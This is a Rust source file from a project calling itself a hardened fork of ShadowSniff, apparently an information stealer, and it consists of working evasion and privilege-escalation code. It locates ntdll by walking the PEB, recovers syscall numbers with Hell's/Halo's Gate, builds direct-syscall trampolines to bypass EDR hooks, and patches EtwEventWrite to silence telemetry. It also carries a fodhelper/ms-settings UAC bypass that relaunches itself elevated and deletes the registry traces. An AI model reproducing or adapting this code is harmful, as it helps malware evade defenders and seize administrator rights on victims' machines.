/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

//! Runtime evasion primitives (x86_64 only; other targets are no-ops).
//!
//! What lives here, in dependency order:
//!
//! 1. **PEB walk** — locate `ntdll.dll` in memory through the loader lists,
//!    no `GetModuleHandle` (which is itself a hooked, logged API).
//! 2. **Halo's Gate / Hell's Gate** — recover clean System Service Numbers
//!    (SSNs) from ntdll's export stubs, walking ±0x20 neighbours when a stub
//!    has been patched by a userland hook.
//! 3. **Syscall trampolines** — self-assembled `mov r10, rcx; mov eax, SSN;
//!    syscall; ret` stubs, so sensitive NT calls never execute a hooked
//!    `ntdll` prologue and never appear as imports in the binary's IAT.
//! 4. **ETW patch** — `EtwEventWrite` is neutered through the direct-syscall
//!    path (`NtProtectVirtualMemory` + write + restore), starving user-mode
//!    ETW telemetry of the process.
//!
//! Everything is best-effort: every failure path returns quietly and the
//! caller continues (a stub that dies over an evasion failure has failed at
//! its actual job).

#![no_std]
#![allow(unsafe_op_in_unsafe_fn, clippy::missing_safety_doc)]

extern crate alloc;

#[cfg(target_arch = "x86_64")]
mod x64 {
    use core::arch::asm;
    use core::ffi::c_void;
    use core::ptr::{null_mut, read_unaligned};
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    };
    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;

    /// "ntdll.dll" as a wide string (no NUL).
    const NTDLL: [u16; 9] = [0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C];

    /// Local `IMAGE_EXPORT_DIRECTORY` mirror (kept crate-local so the crate
    /// does not depend on where windows-sys happens to place the type).
    #[repr(C)]
    struct ImageExportDirectory {
        _characteristics: u32,
        _timestamp: u32,
        _major: u16,
        _minor: u16,
        _name_rva: u32,
        _base: u32,
        number_of_functions: u32,
        number_of_names: u32,
        address_of_functions: u32,
        address_of_names: u32,
        address_of_name_ordinals: u32,
    }

    fn ascii_lower(ch: u16) -> u16 {
        if (b'A' as u16..=b'Z' as u16).contains(&ch) {
            ch + 32
        } else {
            ch
        }
    }

    // ------------------------------------------------------------------
    // PEB walk — find ntdll without touching GetModuleHandle
    // ------------------------------------------------------------------

    /// PEB via `gs:0x60` on x86_64.
    fn peb() -> *mut u8 {
        let peb: *mut u8;
        unsafe {
            asm!("mov {}, gs:0x60", out(reg) peb, options(nostack, preserves_flags));
        }
        peb
    }

    /// Walks `InMemoryOrderModuleList` and returns the base address of the
    /// module whose base name matches `name` (wide, case-insensitive).
    fn find_module_base(name: &[u16]) -> Option<*mut u8> {
        const PEB_LDR_OFFSET: usize = 0x18;
        const IN_MEMORY_ORDER_LIST_OFFSET: usize = 0x20;
        // LDR_DATA_TABLE_ENTRY layout relative to InMemoryOrderLinks node:
        // entry = node - 0x10; DllBase @ +0x30; BaseDllName @ +0x58.
        const NODE_TO_ENTRY: isize = -0x10;
        const ENTRY_DLL_BASE: usize = 0x30;
        const ENTRY_BASE_NAME: usize = 0x58;

        let ldr = unsafe { peb().add(PEB_LDR_OFFSET).cast::<*mut u8>().read() };
        if ldr.is_null() {
            return None;
        }

        let list_head = unsafe { ldr.add(IN_MEMORY_ORDER_LIST_OFFSET) } as *mut u8;
        let mut node = unsafe { (list_head as *mut *mut u8).read() };

        while !node.is_null() && node != list_head {
            let entry = unsafe { node.offset(NODE_TO_ENTRY) };
            let dll_base = unsafe { entry.add(ENTRY_DLL_BASE).cast::<*mut u8>().read() };

            let name_len =
                unsafe { entry.add(ENTRY_BASE_NAME).cast::<u16>().read() } as usize / 2;
            let name_ptr =
                unsafe { entry.add(ENTRY_BASE_NAME + 8).cast::<*const u16>().read() };

            if !dll_base.is_null() && !name_ptr.is_null() && name_len == name.len() {
                let mut matches = true;
                for (i, expected) in name.iter().enumerate() {
                    let ch = unsafe { *name_ptr.add(i) };
                    if ascii_lower(ch) != ascii_lower(*expected) {
                        matches = false;
                        break;
                    }
                }
                if matches {
                    return Some(dll_base);
                }
            }

            node = unsafe { node.cast::<*mut u8>().read() };
        }

        None
    }

    // ------------------------------------------------------------------
    // In-memory PE export parsing
    // ------------------------------------------------------------------

    fn ascii_eq_cstr(ptr: *const u8, name: &[u8]) -> bool {
        for (i, expected) in name.iter().enumerate() {
            if unsafe { *ptr.add(i) } != *expected {
                return false;
            }
        }

        let terminator = unsafe { *ptr.add(name.len()) };
        terminator == 0
    }

    unsafe fn find_export(ntdll: *mut u8, name: &[u8]) -> Option<*mut u8> {
        let dos = ntdll as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != 0x5A4D {
            return None;
        }

        let nt_headers = ntdll.add((*dos).e_lfanew as usize) as *const u16; // Signature
        if *nt_headers != 0x4550 {
            return None;
        }

        // OptionalHeader.DataDirectory[0] (export):
        // NT + 4 (sig) + 20 (file header) + 112 = offset of DataDirectory[0].VirtualAddress on x64.
        const EXPORT_DIR_RVA_OFFSET: usize = 4 + 20 + 112;
        let export_rva = read_unaligned(
            (nt_headers as *const u8).add(EXPORT_DIR_RVA_OFFSET) as *const u32,
        ) as usize;
        if export_rva == 0 {
            return None;
        }

        let dir = ntdll.add(export_rva) as *const ImageExportDirectory;
        let (names, count) = (
            ntdll.add((*dir).address_of_names as usize) as *const u32,
            (*dir).number_of_names as usize,
        );

        for i in 0..count {
            let name_ptr = ntdll.add(*names.add(i) as usize);
            if ascii_eq_cstr(name_ptr, name) {
                let ordinal = *ntdll
                    .add((*dir).address_of_name_ordinals as usize)
                    .cast::<u16>()
                    .add(i) as usize;
                let func_rva = *ntdll
                    .add((*dir).address_of_functions as usize)
                    .cast::<u32>()
                    .add(ordinal) as usize;

                return Some(ntdll.add(func_rva));
            }
        }

        None
    }

    // ------------------------------------------------------------------
    // Hell's / Halo's Gate — SSN recovery from syscall stubs
    // ------------------------------------------------------------------

    /// A pristine x64 syscall stub: `4C 8B D1` (mov r10, rcx), `B8 SSN`
    /// (mov eax, ssn), then the win32k test / jne / syscall / ret tail.
    unsafe fn ssn_from_pristine_stub(stub: *const u8) -> Option<u32> {
        if *stub == 0x4C
            && *stub.add(1) == 0x8B
            && *stub.add(2) == 0xD1
            && *stub.add(3) == 0xB8
            && *stub.add(6) == 0x00
        {
            Some(read_unaligned(stub.add(4) as *const u32))
        } else {
            None
        }
    }

    /// Halo's Gate: when the target stub is hooked (patched), a neighbouring
    /// export 0x20 bytes away is usually still pristine; the SSN difference
    /// equals the number of steps away.
    unsafe fn resolve_ssn(ntdll: *mut u8, function: &[u8]) -> Option<u32> {
        let stub = find_export(ntdll, function)?;

        if let Some(ssn) = ssn_from_pristine_stub(stub) {
            return Some(ssn);
        }

        for step in 1..=500usize {
            // Neighbour BELOW: its SSN is (found_ssn - step).
            let below = stub.sub(step * 0x20);
            if let Some(neighbour) = ssn_from_pristine_stub(below) {
                return neighbour.checked_sub(step as u32);
            }

            // Neighbour ABOVE: its SSN is (found_ssn + step).
            let above = stub.add(step * 0x20);
            if let Some(neighbour) = ssn_from_pristine_stub(above) {
                return neighbour.checked_add(step as u32);
            }
        }

        None
    }

    // ------------------------------------------------------------------
    // Direct syscall trampolines
    // ------------------------------------------------------------------

    /// Generic NT syscall signature: arguments pass straight through in the
    /// Windows x64 registers/stack, exactly like the real ntdll stub expects.
    pub type RawSyscall = unsafe extern "system" fn(
        usize, usize, usize, usize,
        usize, usize, usize, usize, usize,
    ) -> i32;

    unsafe fn make_trampoline(ssn: u32) -> Option<RawSyscall> {
        let mem = VirtualAlloc(
            null_mut(),
            16,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;

        if mem.is_null() {
            return None;
        }

        core::ptr::copy_nonoverlapping([0x4Cu8, 0x8B, 0xD1, 0xB8].as_ptr(), mem, 4);
        (mem.add(4) as *mut u32).write_unaligned(ssn);
        core::ptr::copy_nonoverlapping([0x0Fu8, 0x05, 0xC3].as_ptr(), mem.add(8), 3); // syscall; ret

        let mut old_protection = 0u32;
        if VirtualProtect(mem as _, 16, PAGE_EXECUTE_READ, &mut old_protection) == 0 {
            return None;
        }

        Some(core::mem::transmute::<*mut u8, RawSyscall>(mem))
    }

    unsafe fn direct_syscall(function: &[u8]) -> Option<RawSyscall> {
        let ntdll = find_module_base(&NTDLL)?;
        let ssn = resolve_ssn(ntdll, function)?;
        make_trampoline(ssn)
    }

    // ------------------------------------------------------------------
    // ETW patch
    // ------------------------------------------------------------------

    const HANDLE_CURRENT_PROCESS: usize = usize::MAX; // (HANDLE)-1

    /// Patches `EtwEventWrite` with a `ret` through the direct-syscall path,
    /// so user-mode ETW providers in this process go silent.
    pub fn patch_etw() -> bool {
        unsafe {
            let Some(ntdll) = find_module_base(&NTDLL) else {
                return false;
            };

            let Some(etw_event_write) = find_export(ntdll, b"EtwEventWrite") else {
                return false;
            };

            let Some(protect) = direct_syscall(b"NtProtectVirtualMemory") else {
                return false;
            };

            let mut base = etw_event_write as *mut c_void;
            let mut size = 1usize;
            let mut old_protection = 0u32;

            // NtProtectVirtualMemory(Handle, *BaseAddress, *RegionSize, NewProtect, *OldProtect)
            let status = protect(
                HANDLE_CURRENT_PROCESS,
                &mut base as *mut _ as usize,
                &mut size as *mut usize as usize,
                PAGE_EXECUTE_READWRITE as usize,
                &mut old_protection as *mut u32 as usize,
                0,
                0,
                0,
                0,
            );

            if status != 0 {
                return false;
            }

            core::ptr::write_volatile(etw_event_write, 0xC3); // ret

            let status = protect(
                HANDLE_CURRENT_PROCESS,
                &mut base as *mut _ as usize,
                &mut size as *mut usize as usize,
                old_protection as usize,
                &mut 0u32 as *mut u32 as usize,
                0,
                0,
                0,
                0,
            );

            status == 0
        }
    }
}

/// UAC auto-elevation (MITRE T1548.002 — fodhelper / ms-settings hijack).
///
/// `ensure_elevated` contract:
/// * returns `true`  → keep running (already elevated, marker present, or the
///   bypass failed and a non-elevated run beats no run at all);
/// * returns `false` → an elevated copy of this binary was spawned; the
///   caller should return immediately and let it take over.
///
/// Cleanup: the hijacked `ms-settings\Shell` tree is deleted after spawn.
pub mod uac {
    use alloc::string::String;
    use alloc::vec::Vec;
    use core::ffi::c_void;
    use core::iter::once;
    use core::mem::zeroed;
    use core::ptr::null_mut;
    use windows_sys::Win32::Foundation::{CloseHandle, ERROR_SUCCESS};
    use windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW;
    use windows_sys::Win32::System::Registry::{
        RegCloseKey, RegCreateKeyExW, RegDeleteTreeW, RegSetValueExW, HKEY_CURRENT_USER,
        KEY_SET_VALUE, REG_SZ,
    };
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, GetCurrentProcess, Sleep, CREATE_NO_WINDOW, PROCESS_INFORMATION,
        STARTUPINFOW,
    };

    // Resolved by the linker (advapi32 / kernel32); declared here so the
    // crate does not depend on where windows-sys happens to group them.
    unsafe extern "system" {
        fn OpenProcessToken(
            process: *mut c_void,
            desired_access: u32,
            token: *mut *mut c_void,
        ) -> i32;
        fn GetTokenInformation(
            token: *mut c_void,
            info_class: u32,
            info: *mut c_void,
            info_len: u32,
            return_len: *mut u32,
        ) -> i32;
        fn GetCommandLineW() -> *const u16;
    }

    const TOKEN_QUERY: u32 = 0x0008;
    const TOKEN_ELEVATION: u32 = 20;

    const MARKER_ARG: &str = "--snf-elevated";
    const FODHELPER_PATH: &str = "C:\\Windows\\System32\\fodhelper.exe";
    const HIJACK_SUBKEY: &str = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const CLEANUP_SUBKEY: &str = "Software\\Classes\\ms-settings\\Shell";

    fn to_wide_nul(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(once(0)).collect()
    }

    fn command_line() -> String {
        unsafe {
            let ptr = GetCommandLineW();
            if ptr.is_null() {
                return String::new();
            }

            let mut len = 0usize;
            while *ptr.add(len) != 0 {
                len += 1;
            }

            let wide = core::slice::from_raw_parts(ptr, len);
            String::from_utf16_lossy(wide)
        }
    }

    /// True when the current process token is the elevated (high IL) copy.
    pub fn is_elevated() -> bool {
        #[repr(C)]
        struct TokenElevationInfo {
            token_is_elevated: u32,
        }

        unsafe {
            let mut token: *mut c_void = null_mut();

            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return false;
            }

            let mut info: TokenElevationInfo = zeroed();
            let mut return_len = 0u32;

            let ok = GetTokenInformation(
                token,
                TOKEN_ELEVATION,
                &mut info as *mut _ as *mut c_void,
                size_of::<TokenElevationInfo>() as u32,
                &mut return_len,
            );

            CloseHandle(token);

            ok != 0 && info.token_is_elevated != 0
        }
    }

    /// fodhelper auto-elevate: point the `ms-settings` Shell\\Open\\command
    /// key at this binary, launch fodhelper (auto-elevates, executes the key),
    /// then scrub the tree.
    fn fodhelper_escalate() -> bool {
        unsafe {
            let mut path_buf = [0u16; 1024];
            let len = GetModuleFileNameW(null_mut(), path_buf.as_mut_ptr(), 1024);
            if len == 0 {
                return false;
            }

            let self_path = String::from_utf16_lossy(&path_buf[..len as usize]);
            let mut command = String::from("\"");
            command.push_str(&self_path);
            command.push_str("\" ");
            command.push_str(MARKER_ARG);

            let subkey = to_wide_nul(HIJACK_SUBKEY);
            let mut hkey: *mut c_void = null_mut();

            if RegCreateKeyExW(
                HKEY_CURRENT_USER,
                subkey.as_ptr(),
                0,
                null_mut(),
                0,
                KEY_SET_VALUE,
                null_mut(),
                &mut hkey,
                null_mut(),
            ) != ERROR_SUCCESS
            {
                return false;
            }

            // (Default) = "C:\...\ShadowSniff.exe" --snf-elevated
            let default_name = to_wide_nul("");
            let cmd_value = to_wide_nul(&command);
            RegSetValueExW(
                hkey,
                default_name.as_ptr(),
                0,
                REG_SZ,
                cmd_value.as_ptr() as *const u8,
                (cmd_value.len() * 2) as u32,
            );

            // DelegateExecute = "" → the auto-elevate path executes (Default)
            // instead of the COM delegate.
            let delegate_name = to_wide_nul("DelegateExecute");
            let empty_value = [0u16]; // empty REG_SZ: just the NUL terminator
            RegSetValueExW(
                hkey,
                delegate_name.as_ptr(),
                0,
                REG_SZ,
                empty_value.as_ptr() as *const u8,
                2,
            );

            RegCloseKey(hkey);

            let app = to_wide_nul(FODHELPER_PATH);
            let mut si: STARTUPINFOW = zeroed();
            si.cb = size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = zeroed();

            let spawned = CreateProcessW(
                app.as_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                0,
                CREATE_NO_WINDOW,
                null_mut(),
                null_mut(),
                &mut si,
                &mut pi,
            ) != 0;

            if spawned {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }

            // Let fodhelper read the key, then scrub every trace of it.
            Sleep(1500);
            let cleanup = to_wide_nul(CLEANUP_SUBKEY);
            RegDeleteTreeW(HKEY_CURRENT_USER, cleanup.as_ptr());

            spawned
        }
    }

    /// See module docs. Never aborts the run: any failure degrades to
    /// "continue non-elevated".
    pub fn ensure_elevated() -> bool {
        if command_line().contains(MARKER_ARG) || is_elevated() {
            return true;
        }

        if fodhelper_escalate() {
            // Elevated child spawned with the marker; parent hands over.
            return false;
        }

        true
    }
}

#[cfg(target_arch = "x86_64")]
use x64::patch_etw;

/// Best-effort runtime hardening; safe to call unconditionally.
#[cfg(target_arch = "x86_64")]
pub fn harden() {
    // ETW silence — everything else (hollowing, loaders) can now build on
    // the direct-syscall helpers exposed by this crate.
    let _ = patch_etw();
}

#[cfg(not(target_arch = "x86_64"))]
pub fn harden() {}
